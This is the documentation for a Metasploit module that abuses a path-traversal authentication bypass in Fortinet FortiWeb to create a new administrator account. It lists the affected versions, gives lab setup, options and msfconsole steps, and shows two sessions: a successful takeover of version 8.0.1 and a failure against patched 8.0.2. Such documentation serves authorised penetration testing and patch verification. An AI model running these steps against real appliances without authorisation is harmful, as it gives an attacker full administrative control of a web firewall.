## Vulnerable Application
This auxiliary module exploits an authentication bypass via path traversal vulnerability in the Fortinet
FortiWeb management interface to create a new local administrator user account. This vulnerability affects the
following versions:

* FortiWeb `8.0.0` through `8.0.1` (Patched in `8.0.2` and above).
* FortiWeb `7.6.0` through `7.6.4` (Patched in `7.6.5` and above).
* FortiWeb `7.4.0` through `7.4.9` (Patched in `7.4.10` and above).
* FortiWeb `7.2.0` through `7.2.11` (Patched in `7.2.12` and above).
* FortiWeb `7.0.0` through `7.0.11` (Patched in `7.0.12` and above).

## Testing
Download a suitable FortiWeb-VM image and create a new VM. When creating the VM, assign the first network interface to a
network you can target later (e.g. your external network), optionally, assign the second network interface to a private
network. Power on the VM, and login to the console with the default username `admin` and a blank password. You will be
asked to create a new admin password. Once you are at the CLI, you can assign an IP address to the management
interface (on `port1`) for your (external) network:

```
FortiWeb # config system interface 

FortiWeb (interface) # edit port1 

FortiWeb (port1) # set ip 192.168.86.200 255.255.255.0

FortiWeb (port1) # end

FortiWeb #
```

You should now be able to access the management interface via HTTPS, e.g. `https://192.168.86.200/login`.

## Options

### NEW_USERNAME
Username to use when creating a new admin account (Defaults to a random value).

### NEW_PASSWORD
Password to use when creating a new admin account (Defaults to a random value).

## Advanced Options

The following advanced options do not need to be changed against a target in a default configuration.

### FORTIWEB_ACCESS_PROFILE
The access profile to use for the new admin account (Defaults to `prof_admin`).

### FORTIWEB_DOMAIN
The domain to use for the new admin account (Defaults to `root`).

### FORTIWEB_DEFAULT_ADMIN_ACCOUNT
The default FortiWeb admin account name (Defaults to `admin`).

## Verification Steps

1. Start msfconsole
2. `use auxiliary/admin/http/fortinet_fortiweb_create_admin`

Configure the target:

3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_HTTP_OR_HTTPS_PORT>` (If different from the default of 443)
5. `set SSL true` (Or set to false if targeting HTTP)

Configure the new admin account you will create. The module will supply a default random value for these.

6. `set NEW_USERNAME <NEW_ADMIN_NAME>`
7. `set NEW_PASSWORD <NEW_ADMIN_PASSWORD>`

Run the module:

8. `check`
9. `run`

Verify you can login using the new admin account you just created:

10. Browse to `https://<TARGET_IP_ADDRESS>:<TARGET_HTTP_OR_HTTPS_PORT>/login` and login using `<NEW_ADMIN_NAME>:<NEW_ADMIN_PASSWORD>`

## Scenarios

### Example 1 (Success against FortiWeb 8.0.1)

```
msf > use auxiliary/admin/http/fortinet_fortiweb_create_admin 
msf auxiliary(admin/http/fortinet_fortiweb_create_admin) > set RHOST 192.168.86.202
RHOST => 192.168.86.202
msf auxiliary(admin/http/fortinet_fortiweb_create_admin) > set NEW_USERNAME pwn3d
NEW_USERNAME => pwn3d
msf auxiliary(admin/http/fortinet_fortiweb_create_admin) > set NEW_PASSWORD pwn3d
NEW_PASSWORD => pwn3d
msf auxiliary(admin/http/fortinet_fortiweb_create_admin) > check
[*] 192.168.86.202:443 - The target appears to be vulnerable.
msf auxiliary(admin/http/fortinet_fortiweb_create_admin) > run
[*] Running module against 192.168.86.202
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[+] New admin account successfully created: pwn3d:pwn3d
[+] Login via https://192.168.86.202:443/login
[*] Auxiliary module execution completed
```

### Example 2 (Failure against FortiWeb 8.0.2)

```
msf auxiliary(admin/http/fortinet_fortiweb_create_admin) > set RHOST 192.168.86.200
RHOST => 192.168.86.200
msf auxiliary(admin/http/fortinet_fortiweb_create_admin) > check
[*] 192.168.86.200:443 - The target is not exploitable. Received a 403 Forbidden response
msf auxiliary(admin/http/fortinet_fortiweb_create_admin) > run autocheck=false
[*] Running module against 192.168.86.200
[!] AutoCheck is disabled, proceeding with exploitation
[-] Auxiliary aborted due to failure: not-vulnerable: Target does not appear vulnerable (403 Forbidden response)
[*] Auxiliary module execution completed
```
